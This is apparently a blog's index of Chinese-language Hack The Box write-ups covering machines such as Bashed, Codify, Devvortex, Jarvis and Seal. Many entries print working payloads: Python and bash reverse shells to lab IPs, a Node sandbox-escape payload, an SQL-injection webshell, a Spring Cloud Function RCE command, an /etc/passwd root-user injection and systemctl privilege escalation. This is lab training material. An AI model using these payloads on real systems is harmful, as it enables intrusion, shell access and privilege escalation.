查看www-data身份所有的权限\nsudo -l\n得知能无密码使用scriptmanager的身份，先转到scriptmanager身份查看有无root运行权限的文件或信息\nsudo -u scriptmanager /bin/bash\nscriptmanager-\u0026gt;root sudo -l 得不到信息\nls -la查看权限信息\n在scripts文件夹中看到俩个文件\n由于 test.txt 由 root 拥有，这意味着脚本 test.py 应由 root 运行。用户 scriptmanager 拥有 test.py 文件，这意味着我可以更改该文件，并将以 root 身份运行\n为了方便编辑test.py前升级一下交互shell\npython3 -c \u0026lsquo;import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\n1 python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 发现依然不好编辑test.py文件，换一个想法，我们本地编辑一个可以获得shell的test.py文件去替代\n1 2 3 4 5 6 7 8 import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;10.10.16.29\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); test.py会每隔一分钟自动执行一次，只需等待系统以root身份去执行文件，然后拿到shell\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/1.jpg","permalink":"https://nergigantes.github.io/htb/bashed/","title":"Bashed"},{"content":"端口扫描，有域名子域名爆破，目录扫描\n在\n/plugins\n目录下发现俩个Jar包，解码一个包拿到一个密码\nwpsacn 扫描用户\nssh登录\n成功\nsudo -l查看权限文件\n发现全局都行\n直接sudo su\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/6.jpg","permalink":"https://nergigantes.github.io/htb/blocky/","title":"Blocky"},{"content":"扫描端口正常网页打开找到一个输入的点\n抓包查看输入的值会被编码64，解析为xml\n想起为xml实体攻击查看文件\n根据之前目录扫到的db.php文件，查看当前文件\n拿到网站管理员的密码\nm19RoAU0hP41A1sTsq6K\n之后探测用户名，探测/etc/passwd文件，查看用户目录在home下的用户\nssh登录\n权限提升 sudo -l查看root权限\n发现能够root执行一个py文件\n阅读文件构造plyload\neval函数中有另一个eval,将执行eval函数\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/20.jpg","permalink":"https://nergigantes.github.io/htb/bountyhunter/","title":"BountyHunter"},{"content":"寻找立足点 简单爆破admin:adminin\n进入后台发现服务器版本ActiveMQ 5.15.15\n搜索poc\nCVE-2023-4660 根据用法使用拿到shell\n提权 尝试通过增加sshkey链接但无法实现\n未完待续\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/26.jpg","permalink":"https://nergigantes.github.io/htb/broker%E6%9C%AA%E5%AE%8C/","title":"Broker（未完）"},{"content":"寻找立足点 扫描端口正常的几个端口，网站打开下来发现版本是search 2.4.0\n网上搜索poc直接反弹shell\n1 \u0026#39;, exec(\u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;10.10.16.21\u0026#39;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/sh\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34;))# 权限提升 scv-root 在进入的目录/var/www/tmp中有.git文件夹，里面含有用户连接git的配置，拿到密码\n换ssh连接，后sudo -l查看root文件\n/usr/bin/python3 /opt/scripts/system-checkup.py *\n运行后有三个选项，分析后发现这个system-checkup.py以当前目录的三个sh文件运行\n我们可以创建一个同名选项的sh文件\neg1:!#/bin/bash（将sh文件化为命令执行台）\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.20.151/7777 0\u0026gt;\u0026amp;1(反弹shell)\nor\necho \u0026lsquo;hacker::0:0:System Administrator:/root/root:/bin/bash\u0026rsquo; \u0026raquo; /etc/passwd（创建一个root权限用户）\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/5.jpg","permalink":"https://nergigantes.github.io/htb/busqueda/","title":"Busqueda"},{"content":"寻找立足点 扫描端口正常，有域名爆子域名无发现，目录扫描无发现\n打开网页发现能够执行js代码\n找一段反弹shell代码执行进入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 sync function fn() { (function stack() { new Error().stack; stack(); })(); } p = fn(); p.constructor = { [Symbol.species]: class FakePromise { constructor(executor) { executor( (x) =\u0026gt; x, (err) =\u0026gt; { return err.constructor.constructor(\u0026#39;return process\u0026#39;)().mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#34;bash -c \u0026#39;bash -i \u0026gt; /dev/tcp/10.10.16.21/2333 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); } ) } } }; p.then(); 权限提升 进入/home查看用户，还有另一个用户joshua无权限\n在/var/www/contact中有一个db文件\ncat能看到joshua的hash密码爆破spongebob1\nssh登录成功\nsudo -l查看root文件\n有一个sudo /opt/scripts/mysql-backup.sh\n该文件有存在不严格匹配的问题\n用大佬的poc拿到root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import string import subprocess all = list(string.ascii_letters + string.digits) password = \u0026#34;\u0026#34; found = False while not found: for character in all: command = f\u0026#34;echo \u0026#39;{password}{character}*\u0026#39; | sudo /opt/scripts/mysql-backup.sh\u0026#34; output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout if \u0026#34;Password confirmed!\u0026#34; in output: password += character print(password) break else: found = True ","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/2.jpg","permalink":"https://nergigantes.github.io/htb/codify/","title":"Codify"},{"content":"寻找立足点 nmap扫描，目录爆破，存在域名加上子域名扫描\n端口，子域名无发现\n目录爆破找到一个接口/actuator\n在/actuator/sessions下发现一个用户的cookie\n更改本地cookie去登录admin界面（注意cookie会变）\n后再cms后台存在命令注入\n不能空格所以￥{IFS}代替\n拿到shell\n权限提升 在/app目录下有个jar包，反编译能在里面找到一个数据库的账号密码和库\n登录拿到admin用户的哈希密码，john爆破\n猜测为josh用户的密码\nssh登录成功\nsudo -l查看能root执行ssh功能\n拿到shell\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/17.jpg","permalink":"https://nergigantes.github.io/htb/cozyhosting/","title":"CozyHosting"},{"content":"寻找立足点 端口，域名，目录三件套\n网站进去是appech的配置默认页面，没有发现啥\n这次没有给域名，根据htb的经验是cronos.htb\n（看wp说是用nslookup能探测到）\n扫子域名，有俩个www和admin\nwww没发现，admin是个登录的\n在用户名有注入点\n具体为admin\u0026rsquo; \u0026ndash; -\n进入一个页面里面能够ping ip\n经典的命令注入拿到shell\n权限提升 进入页面有个数据库的配置文件，拿到一个admin用户和密码，不过没啥用，user.txt也可以拿到\nlinpeas.sh扫到一个root权限有运行文件\n我们还有更改这个文件的权限\n直接将shell文件重命名拿到root\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/9.jpg","permalink":"https://nergigantes.github.io/htb/cronos/","title":"Cronos"},{"content":"寻找立足点 端口，域名，目录\n网页源代码最下面有个提示sercet.txt\n打开是个base64解码 “Curling2018!”\n根据网页有个叫 Floris 的人，登录\n进入后台在模板管理界面能写php\n进入系统\n权限提升 在floris的用户目录下有个文件名提升是密码备份\n层层解压拿到密码\nssh登录\n之后wp说有个系统进程能看到\n这样的\n但是我的没有不知道为什么\n提权思路\n把input的url网址用文件协议改为自己的/etc/shadow这样看密码\n1 url = \u0026#34;file:///etc/shadow\u0026#34; 也可以在创建一个没有密码的id_rsa.pub文件放进\n1 \u0026#34;/root/.ssh/authorized_keys\u0026#34; 中，就可以登录root\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/6.jpg","permalink":"https://nergigantes.github.io/htb/curling/","title":"Curling"},{"content":"寻找立足点\n拿到ip扫端口\n开了俩22，80\n浏览器打开未发现信息，使用gobuster扫描子域名，有dev，加入hosts文件打开\n扫描这个增加网站之后的，扫到了cms，joomla\n据查joomscan能扫cms信息（但是我无法扫到任何信息）\n看wp得知/administrator/manifests/files/joomla.xml目录下有网站版本信息\n搜索joomla4.2.6版本信息得知**Joomla未授权访问漏洞(CVE-2023-23752)**\n/api/index.php/v1/config/application?public=true访问该目录可以拿到泄露信息\nlewis\nP4ntherg0t1n5r3c0n##\n登录cms账号密码\n在System-\u0026gt;Templates-\u0026gt;Administrator Templates-\u0026gt;login.php\n中增加反弹shell代码链接\nexec(\u0026quot;/bin/bash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.29/4444 0\u0026gt;\u0026amp;1\u0026rsquo;\u0026quot;);\n成功连接\n2提权 从www-data-\u0026gt;logan 流程是连接mysql数据库拿到密码通过ssh登录logan(但不知道为什么我一直不成功)\n从logan-\u0026gt;root 查看当前用户可以用那些root权限文件sudo -l\n有一个/usr/bin/apport-cli文件，查看apport-cli版本有无历史漏洞，发现有\nCVE-2023-1326 version\u0026lt;2.26\n运行了 apport-cli 并设置了 -f 或 — file-bug 标志。创建报告后，选择选项 v 以查看报告最后，输入 ！/bin/bash 以 root 身份放入升级到升级的 bash 脚本中\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/19.jpg","permalink":"https://nergigantes.github.io/htb/devvortex/","title":"Devvortex"},{"content":"外网打点 扫端口，有域名扫子域名，扫目录\n打开网址\n界面可以上传网址然后通过curl拿到网址的信息\n有个后台域名admin.forge.htb\n后台域名限制了本地ip访问（常规绕过也不管用）\n所以思路就是制造ssrf攻击\n测试admin.forge.htb\n有黑名单\n双大写绕过ADMIN.FORGE.htb\n从这里得知upload可以用ftp协议\nhttp://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/\n有用，之后拿/.ssh/id_rsa\n拿到user.txt\n提权 linpeas.sh扫pwnkit\n上传脚本提权成功\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/16.jpg","permalink":"https://nergigantes.github.io/htb/forge/","title":"Forge"},{"content":"寻找立足点 扫描端口正常，打开网页添加域名，该域名下无任何发现，扫一下目录和子域名\n扫到一个子域名api-prod打开是一个Strapi MCS框架的网页，在admin/init路径下发现具体版本，网上搜索poc反弹shell拿到立足点\n权限提升 上传linpeas扫，linpeas提示cve-2021-4034（Pwnkit）可以用\n上传c语言脚本编写拿到shell\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/2.jpg","permalink":"https://nergigantes.github.io/htb/horizontall/","title":"Horizontall"},{"content":"立足点 curl -X POST http://0.0.0.0:8080/functionRouter -H \u0026lsquo;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\u0026ldquo;touch /tmp/pwned\u0026rdquo;)\u0026rsquo; \u0026ndash;data-raw \u0026lsquo;data\u0026rsquo; -v\n权限提升 pspy64看系统进程\nhosts: localhost tasks:\nname: Checking webapp service\nshell:\ncmd: bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/4444 0\u0026gt;\u0026amp;1' ","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/21.jpg","permalink":"https://nergigantes.github.io/htb/inject/","title":"Inject"},{"content":"要点：\n在网页找到sql注入点\n1 order by 8得知有7 列\nhttp://10.10.10.143/room.php?cod=-1 union select 1,\u0026rsquo;\u003c?php system($_GET[1]); ?\u003e\u0026rsquo;,3,4,5,6,7 into outfile \u0026lsquo;/var/www/html/pwned.php\u0026rsquo;\n权限提升\n拿到www的shell\n查看权限能用一个py文件#!/usr/bin/env python3\nfrom datetime import datetime\nimport sys\nimport os\nfrom os import listdir\nimport re\ndef show_help():\nmessage=\u0026rsquo;''\nSimpler - A simple simplifier ;) * Version 1.0 * Usage: python3 simpler.py [options]\nOptions:\n-h/\u0026ndash;help : This help\n-s : Statistics\n-l : List the attackers IP\n-p : ping an attacker IP\n\u0026rsquo;\u0026rsquo;\u0026rsquo;\nprint(message)\ndef show_header():\nprint(\u0026rsquo;\u0026rsquo;\u0026rsquo;***********************************************\n_ _\n(__) __ ___ _ __ | | ___ _ __ _ __ _ _\n/ | | \u0026lsquo; _ | \u0026lsquo; | |/ _ \\ \u0026lsquo;__| \u0026lsquo; | | | |\n__ \\ | | | | | | |) | | / | | |) | || |\n|/__|| || || .__/|||()| ./ __, |\n__ || || |__/\n@ironhackers.es\n\u0026lsquo;\u0026rsquo;\u0026rsquo;)\ndef show_statistics():\npath = \u0026lsquo;/home/pepper/Web/Logs/\u0026rsquo;\nprint(\u0026lsquo;Statistics\\n\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;\u0026rsquo;)\nlisted_files = listdir(path)\ncount = len(listed_files)\nprint(\u0026lsquo;Number of Attackers: \u0026rsquo; + str(count))\nlevel_1 = 0\ndat = datetime(1, 1, 1)\nip_list = []\nreks = []\nip = \u0026rsquo;\u0026rsquo;\nreq = \u0026rsquo;\u0026rsquo;\nrek = \u0026rsquo;\u0026rsquo;\nfor i in listed_files:\nf = open(path + i, \u0026lsquo;r\u0026rsquo;)\nlines = f.readlines()\nlevel2, rek = get_max_level(lines)\nfecha, requ = date_to_num(lines)\nip = i.split(\u0026rsquo;.\u0026rsquo;)[0] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[1] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[2] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[3]\nif fecha \u0026gt; dat:\ndat = fecha\nreq = requ\nip2 = i.split(\u0026rsquo;.\u0026rsquo;)[0] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[1] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[2] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[3]\nif int(level2) \u0026gt; int(level_1):\nlevel_1 = level2\nip_list = [ip]\nreks=[rek]\nelif int(level2) == int(level_1):\nip_list.append(ip)\nreks.append(rek)\nf.close()\n1 2 3 4 5 6 7 8 9 print(\u0026#39;Most Risky:\u0026#39;) if len(ip_list) \u0026gt; 1: print(\u0026#39;More than 1 ip found\u0026#39;) cont = 0 for i in ip_list: print(\u0026#39; \u0026#39; + i + \u0026#39; - Attack Level : \u0026#39; + level_1 + \u0026#39; Request: \u0026#39; + reks[cont]) cont = cont + 1 print(\u0026#39;Most Recent: \u0026#39; + ip2 + \u0026#39; --\u0026gt; \u0026#39; + str(dat) + \u0026#39; \u0026#39; + req) def list_ip():\nprint(\u0026lsquo;Attackers\\n\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;\u0026rsquo;)\npath = \u0026lsquo;/home/pepper/Web/Logs/\u0026rsquo;\nlisted_files = listdir(path)\nfor i in listed_files:\nf = open(path + i,\u0026lsquo;r\u0026rsquo;)\nlines = f.readlines()\nlevel,req = get_max_level(lines)\nprint(i.split(\u0026rsquo;.\u0026rsquo;)[0] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[1] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[2] + \u0026lsquo;.\u0026rsquo; + i.split(\u0026rsquo;.\u0026rsquo;)[3] + \u0026rsquo; - Attack Level : \u0026rsquo; + level)\nf.close()\ndef date_to_num(lines):\ndat = datetime(1,1,1)\nip = \u0026rsquo;\u0026rsquo;\nreq=\u0026rsquo;\u0026rsquo;\nfor i in lines:\nif \u0026lsquo;Level\u0026rsquo; in i:\nfecha=(i.split(\u0026rsquo; \u0026lsquo;)[6] + \u0026rsquo; \u0026rsquo; + i.split(\u0026rsquo; \u0026lsquo;)[7]).split(\u0026rsquo;\\n\u0026rsquo;)[0]\nregex = \u0026lsquo;(\\d+)-(.)-(\\d+)(.)\u0026rsquo;\nlogEx=re.match(regex, fecha).groups()\nmes = to_dict(logEx[1])\nfecha = logEx[0] + \u0026lsquo;-\u0026rsquo; + mes + \u0026lsquo;-\u0026rsquo; + logEx[2] + \u0026rsquo; \u0026rsquo; + logEx[3]\nfecha = datetime.strptime(fecha, \u0026lsquo;%Y-%m-%d %H:%M:%S\u0026rsquo;)\nif fecha \u0026gt; dat:\ndat = fecha\nreq = i.split(\u0026rsquo; \u0026lsquo;)[8] + \u0026rsquo; \u0026rsquo; + i.split(\u0026rsquo; \u0026lsquo;)[9] + \u0026rsquo; \u0026rsquo; + i.split(\u0026rsquo; \u0026lsquo;)[10]\nreturn dat, req\ndef to_dict(name):\nmonth_dict = {\u0026lsquo;Jan\u0026rsquo;:\u0026lsquo;01\u0026rsquo;,\u0026lsquo;Feb\u0026rsquo;:\u0026lsquo;02\u0026rsquo;,\u0026lsquo;Mar\u0026rsquo;:\u0026lsquo;03\u0026rsquo;,\u0026lsquo;Apr\u0026rsquo;:\u0026lsquo;04\u0026rsquo;, \u0026lsquo;May\u0026rsquo;:\u0026lsquo;05\u0026rsquo;, \u0026lsquo;Jun\u0026rsquo;:\u0026lsquo;06\u0026rsquo;,\u0026lsquo;Jul\u0026rsquo;:\u0026lsquo;07\u0026rsquo;,\u0026lsquo;Aug\u0026rsquo;:\u0026lsquo;08\u0026rsquo;,\u0026lsquo;Sep\u0026rsquo;:\u0026lsquo;09\u0026rsquo;,\u0026lsquo;Oct\u0026rsquo;:\u0026lsquo;10\u0026rsquo;,\u0026lsquo;Nov\u0026rsquo;:\u0026lsquo;11\u0026rsquo;,\u0026lsquo;Dec\u0026rsquo;:\u0026lsquo;12\u0026rsquo;}\nreturn month_dict[name]\ndef get_max_level(lines):\nlevel=0\nfor j in lines:\nif \u0026lsquo;Level\u0026rsquo; in j:\nif int(j.split(\u0026rsquo; \u0026lsquo;)[4]) \u0026gt; int(level):\nlevel = j.split(\u0026rsquo; \u0026lsquo;)[4]\nreq=j.split(\u0026rsquo; \u0026lsquo;)[8] + \u0026rsquo; \u0026rsquo; + j.split(\u0026rsquo; \u0026lsquo;)[9] + \u0026rsquo; \u0026rsquo; + j.split(\u0026rsquo; \u0026lsquo;)[10]\nreturn level, req\ndef exec_ping():\nforbidden = [\u0026rsquo;\u0026amp;\u0026rsquo;, \u0026lsquo;;\u0026rsquo;, \u0026lsquo;-\u0026rsquo;, \u0026lsquo;\u0026rsquo;, \u0026lsquo;||\u0026rsquo;, \u0026lsquo;|\u0026rsquo;]\ncommand = input(\u0026lsquo;Enter an IP: \u0026lsquo;)\nfor i in forbidden:\nif i in command:\nprint(\u0026lsquo;Got you\u0026rsquo;)\nexit()\nos.system(\u0026lsquo;ping \u0026rsquo; + command)\nif name == \u0026lsquo;main\u0026rsquo;:\nshow_header()\nif len(sys.argv) != 2:\nshow_help()\nexit()\nif sys.argv[1] == \u0026lsquo;-h\u0026rsquo; or sys.argv[1] == \u0026lsquo;\u0026ndash;help\u0026rsquo;:\nshow_help()\nexit()\nelif sys.argv[1] == \u0026lsquo;-s\u0026rsquo;:\nshow_statistics()\nexit()\nelif sys.argv[1] == \u0026lsquo;-l\u0026rsquo;:\nlist_ip()\nexit()\nelif sys.argv[1] == \u0026lsquo;-p\u0026rsquo;:\nexec_ping()\nexit()\nelse:\nshow_help()\nexit(）\n要点是这里的-p选项 不输入ip\n输入$(command)\n将shell写入/tmp/shell.sh文件中\n然后执行这个py文件\n$(/tmp/shell.sh)\npepper到root\n查看可执行二进制文件中有\n/bin/systemctl\nGTFIBins查看提权\n1 2 3 4 5 6 7 8 9 10 sudo install -m =xs $(which systemctl) . TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;id \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TF TF=$(mktemp).service\necho \u0026lsquo;[Service]\nType=oneshot\nExecStart=/bin/sh -c \u0026ldquo;chmod +s /bin/bash\u0026rdquo;\n[Install]\nWantedBy=multi-user.target\u0026rsquo; \u0026gt; 11.service\n/bin/systemctl link $TF\n/bin/systemctl enable \u0026ndash;now $TF\n这里经实验只有/hoem/pepper主文件下的service文件才可以进行连接到\nsystemctl进行托管\n而/tmp下的文件不行\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/27.jpg","permalink":"https://nergigantes.github.io/htb/jarvis/","title":"Jarvis"},{"content":"外网打点\n三板斧\n开了三个端口 22，443，8080\n有域名扫子域名无果\n扫目录\n现在要么就是看不了要么就是要登录，看8080端口\n在一个历史版本里找到了用户密码\n登录了之前扫401的目录\n看/manger/status/all看不到管理界面\n看一下html的但是跳到nginx了。。。（这不是tomcat吗？）\n之后搜了下这是用nginx反向代理了tomcat\n之后看了其他大佬的wp\n这里存在一个目录穿越\n大体就是tomcat会将/..;/解析成传统意义上的/../，而nginx不会。所以nginx放过了本该拦截的URL访问，这样我们就能进入控制台了。\n1 2 3 Web servers and reverse proxies normalize the request path. For example, the path /image/../image/ is normalized to /images/ . When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency. Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is. This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping. /manger/status/..;/html进入到管理后台\n看到可以上传war文件上传一个🐎拿到shell\n权限提升 找了半天找到一个run.yml\n1 2 3 4 5 6 7 8 9 10 11 12 - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34; - name: Clean file: state: absent path: /opt/backups/files/ 代码解释\nsynchronize模块：其功能是把源目录/var/lib/tomcat9/webapps/ROOT/admin/dashboard复制到目标目录/opt/backups/files，并且复制符号链接。\narchive模块：将/opt/backups/files/目录打包成一个压缩文件，文件名包含当前日期和时间，存于/opt/backups/archives/目录下。\nfile模块：把/opt/backups/files/目录删除。\n开启了copy_links，我们可以把一些好东西连接到/var/lib/tomcat9/webapps/ROOT/admin/dashboard目录下，然后让这个进程打包，之后我们再解压拿到东西\n正好我们有在/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads下写的权限\n1 ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa 然后等待我们的id_rsa\nssh登录拿到user.txt\nsudo -l查看超级权限\n","date":"2025-03-19T14:05:44+08:00","image":"https://nergigantes.github.io/1.jpg","permalink":"https://nergigantes.github.io/htb/seal/","title":"Seal"}]